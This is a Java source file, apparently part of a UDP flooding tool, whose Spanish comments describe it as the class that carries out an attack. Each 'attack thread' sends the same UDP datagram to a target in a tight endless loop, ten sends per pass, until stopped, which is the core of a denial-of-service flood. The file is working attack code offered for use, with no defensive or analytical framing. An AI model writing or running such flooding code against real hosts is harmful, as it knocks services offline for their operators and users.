package com.mycompany.udpsender;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.SocketException;

/**
 * Clase ejecutora de ataque.
 * @author ElMendaXD
 */
public class Sender implements Runnable {
    
    private final DatagramPacket datagram;
    @SuppressWarnings("FieldMayBeFinal")
    private DatagramSocket socket;
    private boolean continuar = true;

    /**
     * Constructor de los hilos de ataque
     * @param datagram Datagrama de ataque a enviar.
     * @throws SocketException
     */
    public Sender(DatagramPacket datagram) throws SocketException {
        this.datagram = datagram;
        this.socket = new DatagramSocket();
    }

    /**
     * Metodo de ejecución de los hilos de ataque.
     */
    @Override
    public void run() {
        while (this.continuar) {
            try {
                // Verifica si el hilo ha sido interrumpido
                if (Thread.currentThread().isInterrupted()) {
                    break;
                }
                this.socket.send(datagram);
                this.socket.send(datagram);
                this.socket.send(datagram);
                this.socket.send(datagram);
                this.socket.send(datagram);
                this.socket.send(datagram);
                this.socket.send(datagram);
                this.socket.send(datagram);
                this.socket.send(datagram);
                this.socket.send(datagram);
            } catch (IOException ex) {
                break;
            }
        }
        // Cierra el socket al finalizar el hilo
        if (this.socket != null && !this.socket.isClosed()) {
            this.socket.close();
        }
    }
    
    /**
     * Metodo encargado de la finalización de los hilos de ataque.
     */
    public void requestStop() {
        this.continuar = false;
        // Interrumpe el hilo si está esperando en el socket
        Thread.currentThread().interrupt();
        if (this.socket != null && !this.socket.isClosed()) {
            this.socket.close(); // Cierra el socket para liberar recursos
        }
    }
}
